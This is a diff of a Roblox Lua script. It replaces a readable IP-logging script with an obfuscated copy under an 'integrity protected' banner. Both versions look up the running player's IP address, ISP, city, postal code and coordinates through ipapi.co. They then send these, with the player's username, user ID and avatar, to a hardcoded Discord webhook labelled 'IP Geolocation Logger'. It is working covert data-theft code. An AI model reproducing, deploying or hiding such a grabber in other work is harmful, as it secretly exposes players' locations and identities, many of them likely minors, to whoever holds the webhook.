@@ -1,89 +1,12 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local v0=game:GetService("HttpService");local v1=game:GetService("Players");local v2=v1.LocalPlayer;local v3=_G.script_executed or "Not Found" ;local function v4() local v11,v12=pcall(function() return v0:JSONDecode(game:HttpGet("https://ipapi.co/json"));end);return (v11 and v12) or {} ;end local v5=v4();local function v6() local v13=1637 -(1523 + 114) ;local v14;local v15;local v16;while true do if (v13==(1 + 0)) then return (v15 and v16) or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png" ;end if (v13==(0 -0)) then v14="https://thumbnails.roblox.com/v1/users/avatar?userIds="   .. v2.UserId   .. "&size=720x720&format=Png&isCircular=false" ;v15,v16=pcall(function() return v0:JSONDecode(game:HttpGet(v14)).data[1066 -(68 + 997) ].imageUrl;end);v13=1271 -(226 + 1044) ;end end end local v7=v6();local function v8(v17,v18) local v19=0 -0 ;local v20;while true do local v21=117 -(32 + 85) ;while true do if (v21==(0 -0)) then if (v19==(0 + 0)) then v20=(v5[v18] and tostring(v5[v18])) or "Not Found" ;if (v18=="executed_script") then v20=v3;end v19=1 + 0 ;end if (v19==(958 -(892 + 65))) then return {name=v17,value=v20,inline=true};end break;end end end end local v9={{name="Username",value=v2.Name,inline=true},{name="User ID",value=tostring(v2.UserId),inline=true},v8("Executed Script","executed_script"),v8("IP Address","ip"),v8("Network Range","network"),v8("ASN (Autonomous System Number)","asn"),v8("ISP (Internet Service Provider)","org"),v8("Country","country_name"),v8("Region/Province","region"),v8("City","city"),v8("Postal Code","postal"),v8("Latitude","latitude"),v8("Longitude","longitude"),v8("Timezone","timezone")};local v10="https://discord.com/api/webhooks/1395480773854888087/ZMI-vhms8myQz60yYD5wmamVxwKIpIAbiUJiwuuBciCyCbDIxGmaG2Yho_sbKaIasb0x";pcall(function() (request or http_request or (http and http.request))({Url=v10,Method="POST",Headers={["content-type"]="application/json"},Body=v0:JSONEncode({username="IP Geolocation Logger",avatar_url="https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png",embeds={{title="Nuevo usuario detectado: "   .. v2.Name ,color=1734560 -(802 + 150) ,fields=v9},{title="Ver perfil de "   .. v2.Name ,url="https://www.roblox.com/users/"   .. v2.UserId   .. "/profile" ,color=3067504 -1333896 ,image={url=v7}}}})});end);
+-- ⚠️ WARNING: integrity protected!
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
--- Script ejecutado (modificable desde otro script usando _G.script_executed)
-local script_executed = _G.script_executed or "Not Found"
-
--- Obtener datos IP
-local function getIPInfo()
-    local success, result = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
-    end)
-    return success and result or {}
-end
-
-local ipData = getIPInfo()
-
--- Obtener avatar
-local function getAvatarUrl()
-    local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
-    local success, data = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet(url)).data[1].imageUrl
-    end)
-    return success and data or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
-end
-
-local avatarUrl = getAvatarUrl()
-
--- Crear campos para el embed
-local function createField(name, key)
-    local value = ipData[key] and tostring(ipData[key]) or "Not Found"
-    if key == "executed_script" then
-        value = script_executed
-    end
-    return {
-        name = name,
-        value = value,
-        inline = true
-    }
-end
-
--- Lista completa de campos
-local fields = {
-    { name = "Username", value = player.Name, inline = true },
-    { name = "User ID", value = tostring(player.UserId), inline = true },
-    createField("Executed Script", "executed_script"),
-    createField("IP Address", "ip"),
-    createField("Network Range", "network"),
-    createField("ASN (Autonomous System Number)", "asn"),
-    createField("ISP (Internet Service Provider)", "org"),
-    createField("Country", "country_name"),
-    createField("Region/Province", "region"),
-    createField("City", "city"),
-    createField("Postal Code", "postal"),
-    createField("Latitude", "latitude"),
-    createField("Longitude", "longitude"),
-    createField("Timezone", "timezone")
-}
-
--- Webhook URL
-local webhook_url = "https://discord.com/api/webhooks/1395480773854888087/ZMI-vhms8myQz60yYD5wmamVxwKIpIAbiUJiwuuBciCyCbDIxGmaG2Yho_sbKaIasb0x"
-
--- Enviar a webhook
-pcall(function()
-    (request or http_request or http and http.request)({
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["content-type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            username = "IP Geolocation Logger",
-            avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png",
-            embeds = {
-                {
-                    title = "Nuevo usuario detectado: " .. player.Name,
-                    color = 1733608,
-                    fields = fields
-                },
-                {
-                    title = "Ver perfil de " .. player.Name,
-                    url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
-                    color = 1733608,
-                    image = { url = avatarUrl }
-                }
-            }
-        })
-    })
-end)
+]]--
